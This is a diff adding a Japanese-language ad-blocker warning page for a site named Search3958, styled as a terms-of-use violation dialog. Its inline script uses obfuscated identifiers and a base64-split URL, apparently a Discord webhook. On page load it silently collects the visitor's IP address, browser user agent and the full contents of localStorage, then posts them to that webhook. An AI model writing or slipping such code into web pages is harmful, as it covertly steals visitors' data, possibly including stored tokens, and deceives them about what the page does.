@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>利用規約に違反しています - Search3958</title>
+  <!-- Google Fonts: M PLUS 2 -->
+  <link href="https://fonts.googleapis.com/css2?family=M+PLUS+2:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #dbdce0;
+      font-family: 'M PLUS 2', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .dialog {
+      background-color: #fff;
+      border-radius: 32px;
+      padding: 32px;
+      max-width: 560px;
+      width: 90%;
+      text-align: center;
+    }
+
+    .dialog h1 {
+      color: #202124;
+      font-size: 20px;
+      margin-bottom: 16px;
+      font-weight: 700;
+    }
+
+    .dialog p {
+      color: #5F6368;
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    .buttons {
+      display: flex;
+      gap: 16px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-bottom: 24px;
+    }
+
+    .buttons a {
+      display: inline-block;
+      text-decoration: none;
+      color: white;
+      background-color: #0d5ad5;
+      padding: 12px 24px;
+      border-radius: 18px;
+      font-weight: 500;
+      font-size: 14px;
+      white-space: nowrap;
+      flex: 1;
+      min-width: 140px;
+      text-align: center;
+    }
+
+    .buttons a:hover {
+      opacity: 0.9;
+    }
+
+    .terms-link {
+      color: #5F6368;
+      font-size: 13px;
+      text-decoration: none;
+    }
+
+    .terms-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="dialog">
+    <h1>利用規約に違反しています</h1>
+    <p>お客様のブラウザで広告ブロッカーが確認されました。<br>
+Search3958のサイトをご利用いただく場合、利用規約に同意したものとみなします。<br>
+多くの問題を避けるためには広告を許可するか、利用規約への同意を撤回してください。</p>
+
+    <div class="buttons">
+      <a href="https://chromewebstore.google.com/?hl=ja" target="_blank" rel="noopener">広告を許可</a>
+      <a href="https://search3958.github.io/entry.html">同意を撤回</a>
+    </div>
+
+    <a href="https://search3958.github.io/policies/trems.html" class="terms-link" target="_blank" rel="noopener">利用規約を確認する</a>
+  </div>
+
+  <script>
+    (() => {
+  'use strict';
+
+  const DEBUG_FS_OBFUSCATED = [
+    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi',
+    'aG9va3MvMTQ1MDc0OTQ4NTA3OTcyNDE0OS9m',
+    'M2xsSlczLWFEa3dQMW9TYms3TlVCSlUwaS1F',
+    'SGtyaXhqb0NrVTVWb1JFNEJNOWdvWkZpd2d3',
+    'd2NUSlJLYjlhQjJZNg=='
+  ];
+
+  const _0x4f2a = ['textContent', 'className', '', 'status-error', 'status-success', 'join', 'https://api.ipify.org?format=json', 'json', '取得失敗', '## UserStopper-DbFS(AdError)\n', 'ja-JP', 'toLocaleString', 'POST', 'application/json', 'すべてのデータを送信しました。'];
+  const _0x5b = (i) => _0x4f2a[i];
+
+  const _0x2c1e = document.getElementById('status');
+  const _0xbtn = document.getElementById('main-send-button');
+  
+  function _0x3e1a(m, isError = false) {
+    if (_0x2c1e) {
+      _0x2c1e[_0x5b(0)] = m;
+      _0x2c1e[_0x5b(1)] = isError ? _0x5b(3) : _0x5b(4);
+    }
+  }
+
+  async function _0x1f92() {
+    try {
+      const r = await fetch(_0x5b(6));
+      const d = await r[_0x5b(7)]();
+      return d.ip;
+    } catch (e) {
+      return _0x5b(8);
+    }
+  }
+
+  async function _0x99a1() {
+    // ボタンが存在する場合のみ無効化
+    if (_0xbtn) _0xbtn.disabled = true;
+    _0x3e1a('送信中...');
+
+    const _0xurl = ((p) => { try { return atob(p[_0x5b(5)]('')); } catch (e) { return null; } })(DEBUG_FS_OBFUSCATED);
+    if (!_0xurl) return;
+
+    const _0xip = await _0x1f92();
+    const _0xtm = new Date()[_0x5b(11)](_0x5b(10));
+    const _0xua = navigator.userAgent;
+
+    let _0xmsg = _0x5b(9);
+    _0xmsg += `-# **TIME**: ${_0xtm}\n`;
+    _0xmsg += `-# **IP**: ${_0xip}\n`;
+    _0xmsg += `-# **UserA**: \`${_0xua}\`\n`;
+    _0xmsg += "## LS\n";
+
+    let _0xf = false;
+    for (let i = 0; i < localStorage.length; i++) {
+      _0xf = true;
+      const k = localStorage.key(i);
+      const v = localStorage.getItem(k);
+      _0xmsg += `**${k}**\n\`\`\`${v}\n\`\`\``;
+    }
+
+    if (!_0xf) _0xmsg += "*LocalStorage is empty*";
+
+    try {
+      const _0xres = await fetch(_0xurl, {
+        method: _0x5b(12),
+        headers: { 'Content-Type': _0x5b(13) },
+        body: JSON.stringify({ content: _0xmsg.substring(0, 2000) })
+      });
+
+      if (_0xres.ok) {
+        _0x3e1a(_0x5b(14));
+      } else {
+        _0x3e1a(`送信エラー: ${_0xres.status}`, true);
+      }
+    } catch (e) {
+      _0x3e1a('ネットワークエラー', true);
+    }
+  }
+
+  // ページ読み込み完了時に実行
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', _0x99a1);
+  } else {
+    _0x99a1();
+  }
+})();
+  </script>
+
+  <script>
+    // ページ表示時に自動で「未同意」と記録
+    localStorage.setItem('termsAccepted', 'false');
+  </script>
+
+</body>
+</html>
